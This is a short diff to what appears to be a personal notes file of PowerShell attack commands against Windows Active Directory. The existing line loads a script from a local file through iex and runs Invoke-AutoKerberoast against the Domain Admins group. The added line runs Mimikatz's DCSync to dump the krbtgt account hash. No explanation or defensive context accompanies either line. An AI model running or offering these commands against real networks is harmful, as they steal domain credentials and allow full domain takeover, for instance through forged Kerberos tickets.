@@ -1,1 +1,3 @@
 ([string](gc .\autoker.txt))|iex; (de)|iex; Invoke-AutoKerberoast -Group "Domain Admins" -Domain ""
+
+Invoke-mimi -Command "lsadump::dcsync /domain:xxx /user:krbtgt"
